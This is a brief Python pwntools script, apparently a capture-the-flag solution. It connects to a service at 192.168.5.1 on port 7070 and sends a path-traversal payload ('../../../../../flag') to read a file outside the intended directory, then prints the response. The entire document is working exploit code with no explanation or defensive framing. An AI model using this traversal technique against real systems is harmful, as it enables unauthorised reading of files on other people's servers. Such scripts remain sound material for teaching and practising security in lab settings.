from pwn import *

io = remote("192.168.5.1", 7070)

io.recv(1)
io.send(b"GET")

payload = b"user \"\shared\../../../../../flag\" 0"
io.send(payload)
log.info(io.recvall())

